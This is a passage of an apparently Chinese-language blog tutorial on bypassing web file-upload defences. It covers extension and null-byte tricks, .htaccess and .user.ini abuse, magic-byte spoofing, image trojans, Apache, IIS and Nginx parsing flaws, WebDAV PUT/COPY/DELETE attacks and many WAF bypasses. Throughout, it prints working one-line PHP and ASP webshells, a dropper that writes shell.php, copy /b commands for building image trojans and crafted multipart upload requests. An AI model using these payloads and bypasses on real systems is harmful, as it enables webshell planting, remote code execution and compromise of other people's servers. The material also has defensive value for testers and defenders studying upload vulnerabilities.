title="方法二:url-decode"></a>方法二:url-decode</h6><p>上传<code>dama.jpg</code>，<code>Burp</code>抓包，将文件名改为<code>dama.php%00.jpg</code>，选中<code>%00</code>，<code>右键</code>-&gt;<code>convert selection</code>-&gt;<code>url-decode</code>,单击<code>GO</code>按钮发送出去</p><h6 id="方法三-直接加-39-0-39"><a href="#方法三-直接加-39-0-39" class="headerlink" title="方法三:直接加&#39;\0&#39;"></a>方法三:直接加<code>&#39;\0&#39;</code></h6><p>上传<code>dama.jpg</code>，<code>Burp</code>抓包，将文件名改为<code>dama.php&#39;\0&#39;.jpg</code>,单击<code>GO</code>按钮发送出去</p><h6 id="方法四-直接改成php"><a href="#方法四-直接改成php" class="headerlink" title="方法四: 直接改成php"></a>方法四: 直接改成php</h6><p>上传<code>dama.jpg</code>，<code>Burp</code>抓包，将文件名改为<code>dama.php</code>,单击<code>GO</code>按钮发送出去</p><h5 id="上传-htaccess文件攻击：（适用于黑名单检测方式，黑名单中未限制-htaccess）"><a href="#上传-htaccess文件攻击：（适用于黑名单检测方式，黑名单中未限制-htaccess）" class="headerlink" title="上传.htaccess文件攻击：（适用于黑名单检测方式，黑名单中未限制.htaccess）"></a>上传<code>.htaccess</code>文件攻击：（适用于黑名单检测方式，黑名单中未限制<code>.htaccess</code>）</h5><p>该文件仅在<code>Apache</code>平台上存在，IIS平台上不存在该文件，该文件默认开启，启用和关闭在<code>httpd.conf</code>文件中配置。该文件的写法如下：</p><pre><code>&lt;FilesMatch &quot;_php.gif&quot;&gt; SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre><p>保存为<code>.htaccess</code>文件。该文件的意思是，<strong>只要遇到文件名中包含有<code>”_php.gif</code>”字符串的，统一按照php文件来执行</strong>。该文件在Apache里默认是启用的，如果没启用，启用方法见：<a href="http://www.jb51.net/article/25476.htm" target="_blank" rel="noopener">http://www.jb51.net/article/25476.htm</a> 然后就可以上传一个带一句话木马的文件，例如<code>a_php.gif</code>，会被当成php执行。该方法其实不是漏洞，是Apache的特性。该方法常用于黑客入侵网站之后，不想被发现，留一个隐蔽的后门。在PHP手册中提到一句话，move_uploaded_file section,there is awarning which states‘If the destination file already exists, it will be overwritten.’服务器端如果采用了黑名单的形式限制上传，但是黑名单中却没有<code>.htaccess</code>文件，那么我们可以<strong>上传<code>.htaccess</code>文件覆盖掉原来的文件</strong>。</p><blockquote><p>这里有一个问题，那就是怎么知道网站是什么搭建平台，服务器类型是什么，这个一般可以通过站长之家，seo查询等查询出来，或者通过一些扫描软件扫描出来</p></blockquote><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190310200353.png" alt></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190310210959.png" alt></p><h5 id="上传-user-ini攻击"><a href="#上传-user-ini攻击" class="headerlink" title="上传.user.ini攻击"></a>上传<code>.user.ini</code>攻击</h5><ul><li><p>当中间件是以<code>fastcgi</code>运行的php都可以用这个方法，<code>.user.ini</code>能被<strong>动态加载</strong>，它也有两个配置项：</p><pre><code>auto_append_fileauto_prepend_file</code></pre></li><li><p>只要在<code>.user.ini</code>中添加<code>auto_prepend_file=aa.jpg</code> 这句话，<strong>就可以让其他php文件执行前自动包含<code>aa.jpg</code></strong>，和<code>require()</code>类似。</p></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190310211018.png" alt></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190310211043.png" alt></p><h5 id="解析漏洞绕过-适用于白名单检测方式"><a href="#解析漏洞绕过-适用于白名单检测方式" class="headerlink" title="解析漏洞绕过(适用于白名单检测方式)"></a>解析漏洞绕过(适用于白名单检测方式)</h5><p>直接上传一个注入过恶意代码的非黑名单文件即可，再利用解析漏洞利用.例如Web容器为<code>IIS 6.0</code>,攻击者将木马文件名改为<code>pentest.asp;1.jpg</code>上传,此时文件名为<code>JPG</code>格式,从而可以顺利通过验证,而<code>IIS 6.0</code>会把<code>pentest.asp;1.jpg</code>当做<code>ASP脚本</code>来执行,最终攻击者可以绕过白名单的检测,并且执行木马程序.</p><h3 id="服务端文件内容检测"><a href="#服务端文件内容检测" class="headerlink" title="服务端文件内容检测"></a>服务端文件内容检测</h3><ul><li>可能会用正则匹配，判断文件头内容是否符合要求<h4 id="文件幻数-文件头-检测："><a href="#文件幻数-文件头-检测：" class="headerlink" title="文件幻数(文件头)检测："></a>文件幻数(文件头)检测：</h4><pre><code>JPG ： FF D8 FF E0 00 10 4A 46 49 46GIF ： 47 49 46 38 39 61 (GIF89a)PNG： 89 50 4E 47</code></pre></li></ul><h5 id="绕过方法：-1"><a href="#绕过方法：-1" class="headerlink" title="绕过方法："></a>绕过方法：</h5><ul><li>主要是检测文件内容开始处的文件幻数，比如图片类型的文件幻数如下：</li><li>要绕过<code>jpg</code> 文件幻数检测就要在文件开头写上下图的值</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190309222508.png" alt></p><ul><li>要绕过<code>gif</code> 文件幻数检测就要在文件开头写上下图的值</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190309222455.png" alt></p><ul><li>要绕过png 文件幻数检测就要在文件开头写上下面的值</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190309222525.png" alt></p><ul><li>然后在文件幻数后面加上自己的一句话木马就行了。如下</li></ul><pre><code>GIF89a&lt;?php phpinfo(); ?&gt;</code></pre><h4 id="文件相关信息检测："><a href="#文件相关信息检测：" class="headerlink" title="文件相关信息检测："></a>文件相关信息检测：</h4><ul><li>一般就是检查图片文件的大小，图片文件的尺寸之类的信息。</li><li>图像文件相关信息检测常用的就是<code>getimagesize()</code>函数</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190310211105.png" alt></p><h5 id="绕过方法：-2"><a href="#绕过方法：-2" class="headerlink" title="绕过方法："></a>绕过方法：</h5><ul><li>伪造好文件幻数，<strong>在后面添加一句话木马之后，再添加一些其他的内容</strong>，增大文件的大小。有点像下面的结构：</li></ul><pre><code>GIF89a(...some binary data for image...)&lt;?php phpinfo(); ?&gt;(... skipping the rest of binary data ...)</code></pre><h4 id="文件加载检测："><a href="#文件加载检测：" class="headerlink" title="文件加载检测："></a>文件加载检测：</h4><ul><li>这个是最变态的检测，一般是调用API或者函数去进行文件加载测试，常见的是图像渲染测试，再变态一点的甚至是进行二次渲染。</li></ul><h5 id="绕过方法：-3"><a href="#绕过方法：-3" class="headerlink" title="绕过方法："></a>绕过方法：</h5><ul><li>针对渲染加载测试：代码注入绕过</li><li>针对二次渲染测试：攻击文件加载器</li></ul><h5 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h5><ul><li>先说下对<code>渲染/加载测试攻击</code>-代码注入绕过,可以用图像处理软件对一张图片进行代码注入。用winhex看数据可以分析出这类工具的原理是在不破坏文件本身的渲染情况下找一个空白区进行填充代码，一般会是图片的<code>注释区</code>。对于渲染测试基本上都能绕过，毕竟本身的文件结构是完整的.</li><li>但如果碰到变态的二次渲染,基本上就没法绕过了，估计就只能对文件加载器进行攻击了。</li><li>一般进行遇到<code>二次渲染</code>，想绕过，就目前个人经验还没想出方法，它相当于是把原本属于图像数据的部分抓了出来，再用自己的API 或函数进行重新渲染，在这个过程中非图像数据的部分直接就被隔离开了。能想到的一个思路就是基于数据二义性，即让数据既是图像数据也包含一句话木马代码，就像shellcode 通过数据二义性绕过IDS 检测特殊字符一样的道理，但现在我还不知道怎么构造出这样的图像文件。</li><li>如果要对文件加载器进行攻击，常见的就是溢出攻击，上传自己的恶意文件后，服务器上的文件加载器会主动进行加载测试，加载测试时被溢出攻击执行shellcode比如access/mdb 溢出</li><li><strong>总之对文件完整性检测的绕过，通常就直接用个结构完整的文件进行代码注入即可</strong>,没必要再去测到底是检查的幻数还是文件头结构之类的了。</li></ul><h4 id="文件内容检测通用绕过方法"><a href="#文件内容检测通用绕过方法" class="headerlink" title="文件内容检测通用绕过方法:"></a>文件内容检测通用绕过方法:</h4><ul><li><strong>通常，对于文件内容检查的绕过，就是直接用一个结构完整的文件进行恶意代码注入</strong> 即可。比如说常用的<code>图片木马</code></li><li>window下用如下命令制作图片木马</li></ul><pre><code>copy /b 1.jpg+1.php</code></pre><p><code>1.jpg</code>里面就包含了<code>1.php</code>里面的内容</p><h2 id="配合Web-Server解析漏洞"><a href="#配合Web-Server解析漏洞" class="headerlink" title="配合Web Server解析漏洞"></a>配合Web Server解析漏洞</h2><h3 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h3><blockquote><p>在<code>Apache 1.x</code>和<code>Apache 2.x</code>中存在解析漏洞</p></blockquote><p>一个文件名为<code>xxx.x1.x2.x3</code>的文件（例如：<code>index.php.fuck</code>）， Apache会从<code>x3</code>的位置往<code>x1</code>的位置开始尝试解析，如果<code>x3</code>不属于Apache能解析的扩展名，那么Apache会尝试去解析<code>x2</code>的位置，这样<strong>一直从后往前尝试，直到遇到一个能解析的扩展名为止,如果都不认识,则会暴露其源代码</strong>。</p><p>以下集成环境都存在<code>扩展名解析顺序漏洞</code>，并且这些环境<strong>都存在对<code>php3</code>文件按照<code>php</code>来解析这个小洞</strong>。</p><pre><code>WampServer2.0AllVersion(WampServer2.0i/Apache2.2.11)WampServer2.1AllVersion(WampServer2.1e-x32/Apache2.2.17)Wamp5AllVersion(Wamp5_1.7.4/Apache2.2.6)AppServ2.4AllVersion(AppServ-2.4.9/Apache2.0.59)AppServ2.5AllVersion(AppServ-2.5.10/Apache2.2.8)AppServ2.6AllVersion(AppServ-2.6.0/Apache2.2.8)</code></pre><p>那么Apache认识哪些扩展名呢?在Apache安装目录下<code>/conf/mime.types</code>文件中有详细的扩展名列表,这种方法可以绕过基于黑名单的检查。</p><ul><li>总结存在该漏洞的Apache版本：<ul><li>Apache2.0.x&lt;=2.0.59</li><li>Apache2.2.x&lt;=2.2.17<h3 id="IIS解析漏洞"><a href="#IIS解析漏洞" class="headerlink" title="IIS解析漏洞"></a>IIS解析漏洞</h3></li></ul></li></ul><h4 id="IIS6-0"><a href="#IIS6-0" class="headerlink" title="IIS6.0"></a>IIS6.0</h4><p><code>IIS 6.0</code>再解析文件的时候存在以下两个解析漏洞：</p><ol><li>当<strong>文件</strong>为<code>*.asp;1.jpg</code>时,<code>IIS 6.0</code>会以<code>ASP脚本</code>来执行</li><li>当建立<code>*.asa</code>,<code>*.asp</code>格式的<strong>文件夹</strong>时,其目录下的任意文件都将被IIS当作<code>asp</code>文件来解析</li><li><code>WebDav(Web-based Distributed Authoring and Versioning)</code>漏洞(对IIS写权限的利用),如果服务器开启<code>WebDav</code>,并且支持<code>PUT</code>,<code>Move</code>,<code>Copy</code>,<code>Delete</code>等方法,就可能存在安全隐患<h5 id="文件类型"><a href="#文件类型" class="headerlink" title="文件类型"></a>文件类型</h5></li></ol><p>Ⅰ:正常：<code>www.xxx.com/logo.jpg</code></p><p>Ⅱ:触发漏洞：<code>www.xxx.com/logo.asp;.jpg</code></p><p>按照Ⅰ来访问<code>logo.jpg</code>，文件会被当成是jpg图片来解析，想办法，能够按照Ⅱ来访问<code>logo.jpg</code>，<strong>文件就会被当成<code>asp</code>文件来处理</strong>。（如果IIS支持PHP，那么<code>logo.php;.jpg</code>也会被当成<code>PHP</code>文件执行）</p><h5 id="文件夹类型"><a href="#文件夹类型" class="headerlink" title="文件夹类型"></a>文件夹类型</h5><p>Ⅰ:正常：<code>www.xxx.com/image/logo.jpg</code></p><p>Ⅱ:触发漏洞：<code>www.xxx.com/image.asp/logo.jpg</code></p><p>按照Ⅰ来访问<code>logo.jpg</code>，文件会被当成是<code>jpg</code>图片来解析，想办法，能够按照Ⅱ来访问<code>logo.jpg</code>，<strong>文件就会被当成<code>asp</code>文件来处理</strong>。（如果IIS支持PHP，那么<code>image.php文件夹</code>下的文件也会被当做<code>PHP</code>文件解析。）</p><h5 id="WebDav"><a href="#WebDav" class="headerlink" title="WebDav"></a>WebDav</h5><blockquote><p>攻击者常用<code>PUT</code>方法上传危险脚本文件,测试步骤如下:</p></blockquote><h6 id="通过OPTIONS探测服务器所支持的HTTP方法"><a href="#通过OPTIONS探测服务器所支持的HTTP方法" class="headerlink" title="通过OPTIONS探测服务器所支持的HTTP方法"></a>通过<code>OPTIONS</code>探测服务器所支持的HTTP方法</h6><pre><code>请求：OPTIONS / HTTP/1.1Host:www.example.com响应：。。。Allow:OPTIONS,TRACE,GET,HEAD,DELETE,PUT,POST,COPY,MOVE,MKCOL,PROPFIND,PROPPATCH,LOCK,UNLOCK,SEARCH。。。</code></pre><h6 id="通过PUT方法向服务器上传脚本文件"><a href="#通过PUT方法向服务器上传脚本文件" class="headerlink" title="通过PUT方法向服务器上传脚本文件"></a>通过<code>PUT</code>方法向服务器上传脚本文件</h6><pre><code>请求：PUT /a.txt HTTP/1.1Host:www.example.comContent-Length:30&lt;%eval request(&quot;chopper&quot;)%&gt;</code></pre><h6 id="通过Move或Copy方法改名"><a href="#通过Move或Copy方法改名" class="headerlink" title="通过Move或Copy方法改名"></a>通过<code>Move</code>或<code>Copy</code>方法改名</h6><pre><code>请求：COPY /a.txt HTTP/1.1Host:www.example.comDestination:http://www.example.com/cmd.asp</code></pre><h6 id="使用DELETE方法，攻击者还可以删除服务器上的任意文件"><a href="#使用DELETE方法，攻击者还可以删除服务器上的任意文件" class="headerlink" title="使用DELETE方法，攻击者还可以删除服务器上的任意文件"></a>使用<code>DELETE</code>方法，攻击者还可以删除服务器上的任意文件</h6><pre><code>请求：DELETE /a.txt HTTP/1.1Host:www.example.com</code></pre><blockquote><p>桂林老兵曾写过一款针对WebDav漏洞的软件:<code>IIS Write</code>,利用这款软件,可以快速探测服务器是否存在WebDav漏洞</p></blockquote><h4 id="IIS7-0以上"><a href="#IIS7-0以上" class="headerlink" title="IIS7.0以上"></a>IIS7.0以上</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><ul><li><code>IIS7.0/7.5</code>是对<code>php解析</code>时有一个类似于Nginx的解析漏洞，对任意文件名只要在URL后面追加上字符串”<code>/任意文件名.php</code>”就<strong>会按照<code>php</code>的方式去解析</strong>。（例如：<code>webshell.jpg/x.php</code>）</li></ul><pre><code>IIS7.0(Win2008R1+IIS7.0)IIS7.5(Win2008R2+IIS7.5)</code></pre><ul><li>IIS的解析漏洞不像Apache那么模糊，针对IIS6.0，只要文件名不被重命名基本都能搞定。这里要注意一点，对于”<code>任意文件名/任意文件名.php</code>”这个漏洞其实是出现自<code>php-cgi</code>的漏洞， 所以其实跟IIS自身是无关的。</li></ul><h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><ul><li>将shell语句，如  </li></ul><pre><code>&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt;</code></pre><p>写在文本<code>xx.txt</code>中(或者shell语句直接写一句话，用菜刀、cknife等直连，只是容易被查杀），然后用命令将shell语句附加在正常图片<code>xx.jpg</code>后</p><pre><code>copy xx.jpg/b + xx.txt/a test.jpg</code></pre><ul><li>上传<code>test.jpg</code>，然后访问<code>test.jpg/.php</code>或<code>test.jpg/abc.php</code>当前目录下就会生成一句话木马 <code>shell.php</code></li></ul><h3 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h3><h4 id="畸形解析漏洞"><a href="#畸形解析漏洞" class="headerlink" title="畸形解析漏洞"></a>畸形解析漏洞</h4><h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h5><ul><li>对任意文件名，在后面添加”<code>/任意文件名.php</code>”的解析漏洞，比如图片木马文件名是<code>test.jpg</code>，可以添加为<code>test.jpg/x.php</code>进行<strong>解析攻击</strong>,那么<code>test.jpg</code>会被当成PHP脚本来解析。注意,此时的<code>x.php</code>是不存在的<blockquote><p>这种解析漏洞其实是<code>PHP CGI</code>漏洞,在PHP配置文件中有个关键的选项:<code>cgi.fi: x_pathinfo</code>,这个选项在某些版本中是默认开启的,在开启时访问URL,比如: <code>http://www.xxser.com/x.txt/x.php</code>,<code>x.php</code>是不存在的文件,所以<strong>PHP会<code>向前递归</code>解析</strong>,于是造成了解析漏洞.由于Nginx和PHP配合很容易造成这种漏洞,所以,PHP CGI漏洞常常被认为是Nginx解析漏洞,所以其实跟Nginx自身是无关的。</p></blockquote></li></ul><h5 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h5><ul><li><p>将shell语句，如  </p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?PHP</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">'shell.php'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'&lt;?php eval($_POST[cmd])?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>写在文本<code>xx.txt</code>中(或者shell语句直接写一句话，用菜刀、cknife等直连，只是容易被查杀）</p></li><li><p>然后用命令将shell语句附加在正常图片<code>xx.jpg</code>后</p></li></ul><pre><code>copy xx.jpg/b + xx.txt/a test.jpg</code></pre><ul><li>上传<code>test.jpg</code>，然后访问<code>test.jpg/.php</code>或<code>test.jpg/abc.php</code>,当前目录下就会生成一句话木马 <code>shell.php</code></li></ul><h4 id="空字节代码执行漏洞"><a href="#空字节代码执行漏洞" class="headerlink" title="空字节代码执行漏洞"></a>空字节代码执行漏洞</h4><h5 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h5><ul><li>低版本的Nginx可以在任意文件名后面添加<code>%00.php</code>进行<strong>解析攻击</strong>。</li></ul><pre><code>Nginx0.5.Nginx0.6.Nginx0.7. &lt;= 0.7.65Nginx0.8. &lt;= 0.8.37</code></pre><h5 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h5><ul><li>比如在图片后附加php代码,然后通过访问<pre><code>xx.jpg%00.php</code></pre>来执行其中的代码</li></ul><h4 id="文件名逻辑漏洞-CVE-2013-4547"><a href="#文件名逻辑漏洞-CVE-2013-4547" class="headerlink" title="文件名逻辑漏洞(CVE-2013-4547)"></a>文件名逻辑漏洞(CVE-2013-4547)</h4><ul><li>受影响的nginx版本: 0.8.41至1.4.3和1.5.7之前的1.5.x</li><li>正常上传一个附加代码的图片<code>test.jpg</code>，访问时后面+<code>空格</code>+<code>\\0</code>+<code>.php</code>，即让图片作为php文件解析</li></ul><pre><code>&quot;/test.jpg \\0.php&quot;</code></pre><h4 id="配置不当目录穿越"><a href="#配置不当目录穿越" class="headerlink" title="配置不当目录穿越"></a>配置不当目录穿越</h4><ul><li>如果绝对路径<code>/home/</code>的URL映射是网站目录<code>/files/</code>，配置写成了<code>/files</code></li></ul><pre><code>location /files {    alias /home/;}</code></pre><ul><li>就可以访问<code>/files../</code>，穿越路径，访问到绝对路径根目录<code>/</code>下的文件列表</li></ul><h2 id="配合操作系统命名规则"><a href="#配合操作系统命名规则" class="headerlink" title="配合操作系统命名规则"></a>配合操作系统命名规则</h2><h3 id="上传不符合windows文件命名规则的文件名"><a href="#上传不符合windows文件命名规则的文件名" class="headerlink" title="上传不符合windows文件命名规则的文件名"></a>上传不符合windows文件命名规则的文件名</h3><pre><code>　　test.asp.　　test.asp(空格)　　test.php:1.jpg　　test.php::$DATA　　shell.php::$DATA…….</code></pre><p>会被windows系统<strong>自动去掉</strong>不符合规则符号后面的内容。  </p><h3 id="linux下后缀名大小写"><a href="#linux下后缀名大小写" class="headerlink" title="linux下后缀名大小写"></a>linux下后缀名大小写</h3><p>在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。</p><h2 id="配合文件包含漏洞"><a href="#配合文件包含漏洞" class="headerlink" title="配合文件包含漏洞"></a>配合文件包含漏洞</h2><h3 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h3><ul><li>校验规则只校验当文件后缀名为<code>asp/php/jsp</code>的文件内容是否为木马。</li></ul><h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h3><blockquote><p>这里拿php为例，此漏洞主要存在于PHP中</p></blockquote><ol><li>先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；</li><li>然后再上传一个.php的文件，内容为<code>&lt;?php Include(&quot;上传的txt文件路径&quot;);?&gt;</code><blockquote><p>文件包含可利用的函数</p></blockquote></li></ol><pre><code>include()include_once()require()require_once()fopen()readfile()等</code></pre><ol start="3"><li>此时，这个php文件就会去引用txt文件的内容，从而绕过校验，下面列举包含的语法：</li></ol><pre><code>#PHP    &lt;?php Include(&quot;上传的txt文件路径&quot;);?&gt; #ASP    &lt;!--#include file=&quot;上传的txt文件路径&quot; --&gt;#JSP    &lt;jsp:inclde page=&quot;上传的txt文件路径&quot;/&gt;or  &lt;%@include file=&quot;上传的txt文件路径&quot;%&gt;</code></pre><h2 id="CMS、编辑器漏洞"><a href="#CMS、编辑器漏洞" class="headerlink" title="CMS、编辑器漏洞"></a>CMS、编辑器漏洞</h2><ol><li>CMS漏洞：比如说JCMS等存在的漏洞，可以针对不同CMS存在的上传漏洞进行绕过。</li><li>编辑器漏洞：比如FCK，ewebeditor等，可以针对编辑器的漏洞进行绕过。<br>这两方面的漏洞以后单独成文汇总，这里点到为止。</li></ol><h2 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h2><h3 id="垃圾数据"><a href="#垃圾数据" class="headerlink" title="垃圾数据"></a>垃圾数据</h3><h4 id="内容中插入干扰字符"><a href="#内容中插入干扰字符" class="headerlink" title="内容中插入干扰字符"></a>内容中插入干扰字符</h4><ul><li>前提: 有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。</li><li>目标: 绕过WAF<strong>对文件内容的校验</strong></li><li>方法: 此种情况可以构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190309221310.png" alt></p><h4 id="字段中插入干扰字符"><a href="#字段中插入干扰字符" class="headerlink" title="字段中插入干扰字符"></a>字段中插入干扰字符</h4><ul><li>前提: 网站具有任意文件上传漏洞，但是安全狗<strong>拦截危险的脚本文件后缀</strong>，比如<code>php、asp、aspx</code>等</li><li>目标: 绕过安全狗对脚本文件后缀的校验</li><li>方法: 可以在<code>Content-Disposition</code>字段和<code>filename</code>字段之间插入任意<strong>大于或者等于</strong><code>508</code>个长度的字符，再配合<strong>特殊文件名</strong>（文件名中间需要有<code>分号</code>或者<code>单引号</code>），</li></ul><pre><code>Content-Disposition:form-data;name=&quot;file&quot;;_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_jnxcc.top_mwww.cnzxsoft.co_......;Filename=&quot;tea;sd.cer&quot;</code></pre><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190309221257.png" alt></p><h3 id="filename"><a href="#filename" class="headerlink" title="filename"></a>filename</h3><h4 id="多个filename"><a href="#多个filename" class="headerlink" title="多个filename"></a>多个<code>filename</code></h4><ul><li>针对早期版本安全狗，可以多加一个filename</li><li>最终上传成功的文件名是<code>xx.php</code>。但是由于解析文件名时，会解析到第一个<code>xx.txt</code>。正则默认都会匹配到第一个。</li></ul><pre><code>Content-Disposition: form-data; name=&quot;file_x&quot;; filename=&quot;xx.txt&quot;; filename=&quot;xx.php&quot;</code></pre><h4 id="filename换行"><a href="#filename换行" class="headerlink" title="filename换行"></a><code>filename</code>换行</h4><ul><li>PHP支持，Java不支持</li></ul><pre><code>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;xx.php&quot;</code></pre><ul><li><p>下面这种换行PHP也支持。</p><pre><code>filename</code></pre></li><li><p>在IIS6.0下如果我们换一种书写方式，把<code>filename</code>放在其他地方：  </p></li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190309221232.png" alt></p><h3 id="POST-GET"><a href="#POST-GET" class="headerlink" title="POST/GET"></a>POST/GET</h3><ul><li>前提: 有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。</li><li>操作: 此种情况可以上传一个POST型的数据包，抓包将POST改为GET。</li></ul><h3 id="利用waf本身缺陷"><a href="#利用waf本身缺陷" class="headerlink" title="利用waf本身缺陷"></a>利用waf本身缺陷</h3><h4 id="删除实体里面的Content-Type字段"><a href="#删除实体里面的Content-Type字段" class="headerlink" title="删除实体里面的Content-Type字段"></a>删除实体里面的<code>Content-Type</code>字段</h4><ul><li>第一种是删除<code>Content</code>整行</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1528645576_937160420_1536893309" alt></p><ul><li>第二种是删除<code>C</code>后面的字符。即删除掉<code>ontent-Type: image/jpeg</code>只留下<code>c</code>，将<code>.php</code>加<code>c</code>后面即可，但是要注意，双引号要跟着<code>c.php</code>。</li></ul><pre><code>正常包：Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;085733uykwusqcs8vw8wky.png&quot;Content-Type: image/png构造包：Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;085733uykwusqcs8vw8wky.pngC.php&quot;</code></pre><h4 id="删除Content-Disposition字段里的空格"><a href="#删除Content-Disposition字段里的空格" class="headerlink" title="删除Content-Disposition字段里的空格"></a>删除Content-Disposition字段里的空格</h4><pre><code>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;yijuhua.php&quot;</code></pre><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190309221203.png" alt></p><ul><li><strong>删除</strong>上面字段<strong>冒号后的空格</strong>或者<strong>name前面的空格</strong>。</li></ul><h4 id="修改Content-Disposition-name-filename的大小写"><a href="#修改Content-Disposition-name-filename的大小写" class="headerlink" title="修改Content-Disposition,name,filename的大小写"></a>修改<code>Content-Disposition</code>,<code>name</code>,<code>filename</code>的大小写</h4><pre><code>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;xx.php&quot;</code></pre><p>比如<code>name</code>转换成<code>Name</code>或者<code>nAme</code>，<code>Content-Disposition</code>转换成<code>content-disposition</code>等</p><h4 id="Boundary边界不一致"><a href="#Boundary边界不一致" class="headerlink" title="Boundary边界不一致"></a>Boundary边界不一致</h4><ul><li>每次文件上传时的Boundary边界都是一致的：</li></ul><pre><code>Content-Type: multipart/form-data; boundary=---------------------------4714631421141173021852555099Content-Length: 253-----------------------------4714631421141173021852555099Content-Disposition: form-data; name=&quot;file1&quot;; filename=&quot;shell.asp&quot;Content-Type: application/octet-stream&lt;%eval request(&quot;a&quot;)%&gt;-----------------------------4714631421141173021852555099--</code></pre><ul><li>但如果容器在处理的过程中并没有严格要求一致的话可能会导致一个问题，两段<code>Boundary</code>不一致使得waf认为这段数据是无意义的，可是容器并没有那么严谨：Win2k3 + IIS6.0 + ASP</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190309221136.png" alt></p><h4 id="文件名处回车"><a href="#文件名处回车" class="headerlink" title="文件名处回车"></a>文件名处回车</h4><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190309221104.png" alt></p><h4 id="多个Content-Disposition"><a href="#多个Content-Disposition" class="headerlink" title="多个Content-Disposition"></a>多个Content-Disposition</h4><ul><li>在IIS的环境下，上传文件时如果存在多个<code>Content-Disposition</code>的话，IIS会取第一个Content-Disposition中的值作为接收参数，而如果waf只是取最后一个的话便会被绕过，Win2k8 + IIS7.0 + PHP  </li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190309221016.png" alt></p><h4 id="双文件上传"><a href="#双文件上传" class="headerlink" title="双文件上传"></a>双文件上传</h4><ul><li>安全狗有专门的<strong>文件上传防御模块</strong>，禁止<code>cdx、cer、cgi、dll、exe、jsp、php、asp、aspx</code>等类型的文件上传。</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190309221001.png" alt></p><p>安全狗进行文件名匹配时候用的是第一个文件名<code>111.jpg</code>，是符合安全要求的，第二个文件没有检查，但是webserver在保存文件的时候却保存了第二个文件名<code>111.php</code>。</p><h4 id="windows特殊字符"><a href="#windows特殊字符" class="headerlink" title="windows特殊字符"></a>windows特殊字符</h4><ul><li>当我们上传一个文件的filename为<pre><code>shell.php{%80-%99}</code></pre>时：waf可能识别为<pre><code>.php{%80-%99}</code></pre>就会导致被绕过。</li></ul><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1528647237_911486288_1536893332" alt></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1528647198_1706008271_1536893346" alt></p><h4 id="交换name和filename的顺序"><a href="#交换name和filename的顺序" class="headerlink" title="交换name和filename的顺序"></a>交换<code>name</code>和<code>filename</code>的顺序</h4><ul><li><strong>规定<code>Content-Disposition</code>必须在最前面</strong>，所以只能交换<code>name</code>和<code>filename</code>的顺序。有的WAF可能会匹配<code>name</code>在前面，<code>filename</code>在后面，所以下面姿势会导致Bypass。</li></ul><pre><code>Content-Disposition: form-data; filename=&quot;xx.php&quot;; name=file</code></pre><h4 id="多个分号"><a href="#多个分号" class="headerlink" 